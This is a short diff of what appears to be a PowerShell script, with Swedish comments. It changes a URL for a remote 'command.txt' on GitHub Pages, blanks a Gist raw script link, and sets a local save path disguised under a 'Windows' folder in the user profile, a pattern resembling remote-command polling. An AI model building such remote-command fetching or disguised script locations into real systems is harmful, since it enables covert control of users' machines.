@@ -1,7 +1,7 @@
-$commandUrl = "https://eliasadenas.github.io/ORM/command.txt"
+$commandUrl = "https://jgerell.github.io/operation_red_monkey/command.txt"
 
 # Klistra in din egna RAW-länk från din GitHub Gist här under:
-$GistRawUrl = "https://gist.githubusercontent.com/Eliasadenas/20b6bf894db665b9af0238399a2d79ea/raw/script.ps1" 
+$GistRawUrl = "" 
 
 # Sökvägen där filen sparas lokalt
 $ScriptPath = "$env:USERPROFILE\Windows\script\script.ps1"
